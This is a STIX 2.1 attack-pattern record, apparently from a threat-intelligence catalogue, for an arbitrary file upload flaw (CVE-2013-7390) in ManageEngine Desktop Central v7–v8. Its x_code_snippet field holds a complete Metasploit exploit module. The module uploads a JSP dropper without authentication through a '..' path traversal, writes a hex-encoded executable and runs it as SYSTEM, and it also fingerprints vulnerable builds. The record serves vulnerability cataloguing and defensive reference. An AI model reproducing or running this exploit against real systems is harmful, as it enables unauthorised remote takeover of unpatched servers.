{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac18c29f-723e-4361-9c9b-79e9b56157ce",
    "created": "2024-08-14T16:52:38.145615Z",
    "modified": "2024-08-14T16:52:38.14562Z",
    "name": "ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in Desktop Central v7 to v8 build 80293. A malicious user can upload a JSP file into the web root without authentication, leading to arbitrary code execution as SYSTEM. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/desktopcentral_file_upload.rb",
            "external_id": "desktopcentral_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-7390"
        },
        {
            "source_name": "reference",
            "url": "http://security-assessment.com/files/documents/advisory/Desktop%20Central%20Arbitrary%20File%20Upload.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2013/Nov/130"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability in Desktop Central v7 to\n        v8 build 80293. A malicious user can upload a JSP file into the web root without\n        authentication, leading to arbitrary code execution as SYSTEM.\n      },\n      'Author'         =>\n        [\n          'Thomas Hibbert <thomas.hibbert[at]security-assessment.com>' # Vulnerability discovery and MSF module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-7390'],\n          ['OSVDB', '100008'],\n          ['URL', 'http://security-assessment.com/files/documents/advisory/Desktop%20Central%20Arbitrary%20File%20Upload.pdf'],\n          ['URL', 'https://seclists.org/fulldisclosure/2013/Nov/130'],\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          [ 'Desktop Central v7 - v8 build 80292 / Windows', {} ]\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-11-11'\n    ))\n\n    register_options([Opt::RPORT(8020)])\n  end\n\n\n  def upload_file(filename, contents)\n    res = send_request_cgi({\n      'uri'       => normalize_uri('agentLogUploader'),\n      'method'    => 'POST',\n      'data'      => contents,\n      'ctype'     => 'text/html',\n      'encode_params' => false,\n      'vars_get'  => {\n        'computerName'  => 'DesktopCentral',\n        'domainName'    => 'webapps',\n        'customerId'    => '..',\n        'filename'      => filename\n      }\n    })\n\n    if res && res.code == 200 && res.body.to_s.empty?\n      return true\n    else\n      return false\n    end\n  end\n\n  # Test for Desktop Central\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(\"configurations.do\"),\n      'method' => 'GET'\n    })\n\n    if res && res.code == 200\n      build = nil\n\n      if res.body.to_s =~ /ManageEngine Desktop Central 7/ ||\n          res.body.to_s =~ /ManageEngine Desktop Central MSP 7/     # DC v7\n\n        print_status(\"Detected Desktop Central v7\")\n      elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ ||\n          res.body.to_s =~ /ManageEngine Desktop Central MSP 8/\n\n        if res.body.to_s =~ /id=\"buildNum\" value=\"([0-9]+)\"\\/>/  # DC v8 (later versions)\n          build = $1\n          print_status(\"Detected Desktop Central v8 #{build}\")\n        else                                                     # DC v8 (earlier versions)\n          print_status(\"Detected Desktop Central v8\")\n        end\n      elsif res.body.to_s =~ /id=\"buildNum\" value=\"([0-9]+)\"\\/>/ # DC v9 (and higher?)\n        build = $1\n      end\n\n      if build.nil?\n        return Exploit::CheckCode::Unknown\n      elsif Rex::Version.new(build) < Rex::Version.new(\"80293\")\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n\n  def exploit\n    print_status(\"Uploading JSP to execute the payload\")\n\n    exe = payload.encoded_exe\n    exe_filename = rand_text_alpha_lower(8) + \".exe\"\n\n    dropper = jsp_drop_and_execute(exe, exe_filename)\n    dropper_filename = rand_text_alpha_lower(8) + \".jsp\"\n\n    if upload_file(dropper_filename, dropper)\n      register_files_for_cleanup(exe_filename)\n      register_files_for_cleanup(\"..\\\\webapps\\\\DesktopCentral\\\\#{dropper_filename}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP upload failed\")\n    end\n\n    print_status(\"Executing payload\")\n    send_request_cgi(\n    {\n      'uri'    => normalize_uri(dropper_filename),\n      'method' => 'GET'\n    })\n  end\n\n\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n\n  def jsp_drop_and_execute(bin_data, output_file)\n    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-11",
    "x_mitre_platforms": [
        "win'"
    ]
}